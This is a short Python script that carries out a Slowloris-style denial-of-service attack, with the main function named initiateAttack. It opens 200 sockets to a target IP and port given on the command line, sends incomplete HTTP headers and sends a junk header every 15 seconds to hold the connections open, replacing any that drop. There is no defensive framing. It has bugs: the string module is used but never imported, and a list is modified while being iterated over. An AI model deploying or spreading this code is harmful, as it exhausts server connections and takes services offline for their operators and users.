import sys
import socket
import random
import time

STANDARD_GET_REQUEST_HEADERS = ["User-agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
                               "User-agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1",
                               "User-agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:24.0) Gecko/20100101 Firefox/24.0",
                               "User-agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0",
                               "User-agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0",
]
SOCKET_CONNECTIONS = []

def sendRequest():
    for s in SOCKET_CONNECTIONS:
        s.send(str.encode("GET / HTTP/1.1\r\n"))

        for header in STANDARD_GET_REQUEST_HEADERS:
            s.send(str.encode("{}\r\n".format(header)))


def create_connection(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    SOCKET_CONNECTIONS.append(s)

def initiateAttack(ip, port):
    for _ in range(200):
        create_connection(ip, port)

    sendRequest()

    while True:
        for connection in SOCKET_CONNECTIONS:
            try:
                connection.send(str.encode("X-a: {}\r\n".format(random.choice(string.ascii_letters))))
            except socket.error:
                SOCKET_CONNECTIONS.remove(connection)
        
        for _ in range(200 - len(SOCKET_CONNECTIONS)):
            create_connection(ip, port)

            sendRequest()

        print("Socket Count: {0}".format(len(SOCKET_CONNECTIONS)))
        time.sleep(15)

def main():
    ip = sys.argv[1]
    port = sys.argv[2]
    initiateAttack(ip, int(port))

if __name__ == "__main__":
    main()